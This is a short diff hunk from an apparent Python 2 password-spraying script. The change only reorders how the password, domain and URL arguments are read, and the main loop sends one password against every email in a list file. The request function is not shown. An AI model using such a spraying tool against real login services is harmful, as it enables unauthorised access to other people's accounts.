@@ -18,9 +18,9 @@ if __name__ == "__main__":
 		print "Usage: %s list domain url password" % sys.argv[0]
 		sys.exit(0)
 
-	password = sys.argv[4]
 	domain = sys.argv[2]
 	url = sys.argv[3]
+	password = sys.argv[4]
 	print "Spraying password %s against %s using domain %s" % (password, url, domain)
 	for email in open(sys.argv[1], "rb").readlines():
 		send_request(email.strip(), password, url, domain)
